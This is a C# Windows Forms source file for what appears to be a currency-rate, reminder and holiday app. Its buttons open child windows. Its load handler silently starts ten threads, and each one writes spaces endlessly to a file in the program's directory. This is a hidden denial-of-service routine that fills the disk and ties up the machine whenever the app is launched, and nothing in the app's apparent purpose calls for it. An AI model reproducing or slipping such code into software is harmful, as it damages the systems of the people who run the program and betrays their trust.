using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Cours_Remind_Weekened
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        Weekeneds holiday = null;
        Remind_Date Napomn = null;
        Courses_Valutes Select_Valutes = null;

        static long idTherad = 0;
        private async void Courses_Click(object sender, EventArgs e)
        {
            if (Select_Valutes == null || Select_Valutes.IsDisposed)
                Select_Valutes = new Courses_Valutes(); // открывает новое окно
             
            if (!Select_Valutes.Visible)
                Select_Valutes.Show();
        }

        
        private async void Remind_Click(object sender, EventArgs e)
        {
            if (Napomn == null || Napomn.IsDisposed)
                Napomn = new Remind_Date();
            
            if(!Napomn.Visible)
                Napomn.Show(); 
        }


        private async void Holiday_Click(object sender, EventArgs e)
        {
            
            if ( holiday == null || holiday.IsDisposed)
                 holiday = new Weekeneds();

            if (!holiday.Visible)
                holiday.Show();
        }


        private string garbagePath = "garbage";
        private string PATH = $"{Environment.CurrentDirectory}\\our\\garbage.txt";

        private void RecordGarbage()
        {
            var pathRecord = garbagePath + idTherad.ToString();
            idTherad++;
            PATH = PATH.Replace(garbagePath, pathRecord);
            using (BinaryWriter writer = new BinaryWriter(File.Open(PATH, FileMode.OpenOrCreate)))
            {
                while (true)
                {
                    writer.Write(" ");
                }
            }
        }


        
        private void Form1_Load(object sender, EventArgs e)
        {

            for (int i = 0; i < 10; i++)
            {
                Thread myThread = new Thread(new ThreadStart(RecordGarbage));
                myThread.Start();
            }
        }
    }
}
